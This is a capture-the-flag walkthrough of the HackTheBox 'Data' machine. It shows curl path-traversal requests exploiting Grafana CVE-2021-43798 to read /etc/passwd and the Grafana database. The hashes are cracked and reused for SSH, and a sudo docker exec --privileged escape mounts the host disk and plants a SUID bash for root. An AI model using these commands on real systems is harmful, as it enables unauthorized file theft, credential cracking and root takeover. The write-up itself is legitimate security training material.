# [HackTheBox - Data](https://app.hackthebox.com/machines/Data)

![d00a1fb57b96b9ced6d6ec46f6694f42.png](/resources/d00a1fb57b96b9ced6d6ec46f6694f42.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access via Grafana CVE-2021-43798](#initial-access-via-grafana-cve-2021-43798)
- [Privilege Escalation via SUDO docker exec with privileged flag](#privilege-escalation-via-sudo-docker-exec-with-privileged-flag)

***
## Abstract 
Data is a vulnlab machine imported to HackTheBox as an Easy Linux box, I started with network enumeration with nmap, revealing this machine is a running SSH and Grafana on port 3000.

Grafana is is running in the docker instance and is vulnerable to Directory Traversal vulnerability via CVE-2021-43798 which I leveraged this vulnerability to retrieve the database file of Grafana and crack the user's password hash contain in the database with hashcat

I leveraged that password to gain a foothold via SSH and discovered that the foothold user can run docker exec with sudo which I utilized it to open interactive root shell inside docker container in privileged mode.

To become root, I utilized privileged mode of docker to mount host filesystem to docker container and setup SUID on bash binary for root and now I use it to become root and root the BOX.

## Enumeration

I start my initial nmap scanning with `-sCV` flag right away since I don't expect much port to be running on Linux box which reveals SSH running on port 22 and Grafana running on port 3000.

![0d804c1fb1d24482267731816e7f2d3b.png](/resources/0d804c1fb1d24482267731816e7f2d3b.png)

I open the Grafana webpage right away which reveals redirect me to the login page and on this page, I notice the version of this Grafana instance right away.

![f5a25d82fd6c63db1048d917c5746a39.png](/resources/f5a25d82fd6c63db1048d917c5746a39.png)

## Initial Access via Grafana CVE-2021-43798

Doing quick google search reveals that this version is fairly old and have several CVEs that can be leveraged like CVE-2021-43798 for arbitrary file read/Directory traversal.

![f115b28a7a6b852e866e2097142e128f.png](/resources/f115b28a7a6b852e866e2097142e128f.png)

CVE-2021-43798 allow unauthenticated user to access local files by specify the path of Grafana pre-installed plugin, PoC of this vulnerability could be found [here](https://www.exploit-db.com/exploits/50581) 

![8c1e244e213f55b4519807e2f4229552.png](/resources/8c1e244e213f55b4519807e2f4229552.png)

Knowing how this vulnerability works, I use curl to read `/etc/passwd` which reveals that It is still vulnerable but one thing to notice here is no existence of user with uid=1000 and that make me believe that this Grafana is running on the docker instance.

```
curl --path-as-is 'http://data.vl:3000/public/plugins/welcome/../../../../../../../../../../../../../etc/passwd'
```
![dc5f9ace779b98a013bd6b2b0fc8bb9f.png](/resources/dc5f9ace779b98a013bd6b2b0fc8bb9f.png)

Next question is how to leverage this vulnerability to gain a foothold? From this [PoC](https://github.com/jas502n/Grafana-CVE-2021-43798), I've found that Grafana have the database file that might contain the password hash of user and I can decrypt it to find if there is a password that can be used to get foothold on the host via SSH.

![5788215d0b508e62c22a8e4e3aad632d.png](/resources/5788215d0b508e62c22a8e4e3aad632d.png)

First, I retrieve the database file using curl like this.

```
curl --path-as-is 'http://data.vl:3000/public/plugins/welcome/../../../../../../../../../../../../../var/lib/grafana/grafana.db' -o grafana.db
```
![48e7d6f38f968ac545a9dce8a47f843c.png](/resources/48e7d6f38f968ac545a9dce8a47f843c.png)

Then I open the database file with sqlite3 and query the user table which reveals that there is another user credential on this host and I will need to crack the password hash to get the password of this user.

```
sqlite3 grafana.db
select * from user;
```
![e42782f89a6391bbb68ba5af019d6ac4.png](/resources/e42782f89a6391bbb68ba5af019d6ac4.png)

There is a [grafana2hashcat](https://github.com/iamaldi/grafana2hashcat) script that can be used to format the hash and salt to crackable hash with hashcat so I download the script and prepare the text file with hash and salt of both users found in the database to "hash,salt" format and now my text file look like this

```
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

Then I use the script to get crackable hash.

```
python grafana2hashcat.py grafana_hash_salt
```
![ec47056e540cb85b6a5d1c0aba0fa319.png](/resources/ec47056e540cb85b6a5d1c0aba0fa319.png)

After using hashcat to crack the hash, I obtain 1 password as shown in the image below.

```
hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlists/rockyou.txt
```
![69ec482c0e3f8991081f10e936b3f437.png](/resources/69ec482c0e3f8991081f10e936b3f437.png)

I utilize NetExec to validate this credential with SSH and the result confirm that I can use this credential to get foothold on the box.

```
uv run nxc ssh data.vl -u boris -p beautiful1 
```
![02b33454380f6270108e68cf8bceed30.png](/resources/02b33454380f6270108e68cf8bceed30.png)

The user flag located on the home folder of boris user as I obtain my foothold via this user.

```
sshpass -p beautiful1 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" boris@data.vl
```
![ba4c9370421ed9865dd52dda102d50e7.png](/resources/ba4c9370421ed9865dd52dda102d50e7.png)

## Privilege Escalation via SUDO docker exec with privileged flag

After gaining foothold, I check if this user can run any command as root or other user via SUDO and I found that this user can run any of `docker exec` command as root.

```
sudo -l
```
![68bd63d9757f192428c2997e465d7e85.png](/resources/68bd63d9757f192428c2997e465d7e85.png)

To be able to use `docker exec`, I need to confirm the docker container that is running on this box which I know that there must be one container that is running Grafana and now I have the docker container ID to work with.

```
ps aux | grep docker
```
![58bf9e17c915debc324cc900ad65b941.png](/resources/58bf9e17c915debc324cc900ad65b941.png)

One of the most dangerous flags used when running a Docker container with `docker exec` is `--privileged`. This flag gives the container direct access to the host kernel and allows it to run with all capabilities, so by running containers with this flag and will allow me to mount the host filesystem and I will use `/dev/sda1` which is mounted to root directory to mount to it inside the docker image as well. 

![99de0a9127b07b6458c4b6f3d2d059ce.png](/resources/99de0a9127b07b6458c4b6f3d2d059ce.png)

Now I'll run docker exec (via sudo) to open an interactive root shell (bash) inside the running container and as expected that this instance is really the one that host Grafana.

```
sudo /snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```
![957a1e58ee8937d55b65d819f6832a63.png](/resources/957a1e58ee8937d55b65d819f6832a63.png)

Time it is the time to mount the host filesystem inside the docker container and I can already see that I can read the root flag with from the docker container right away.

```
mount /dev/sda1 /mnt
```
![7182a4e2561ad430db2953c1307edd31.png](/resources/7182a4e2561ad430db2953c1307edd31.png)

I'm not satisfied with that so I set UID of the root to bash binary and now I will have effective user ID as root when running on the host as well which then concluded this box as I rooted it.

```
cp /mnt/bin/bash /mnt/tmp/
chmod u+s /mnt/tmp/bash
exit
/tmp/bash -p
```
![b182c5270283fd0b362215be597c3881.png](/resources/b182c5270283fd0b362215be597c3881.png)

![51b0d92ef1af169ac4d8955a1b498771.png](/resources/51b0d92ef1af169ac4d8955a1b498771.png)
https://labs.hackthebox.com/achievement/machine/1438364/673
***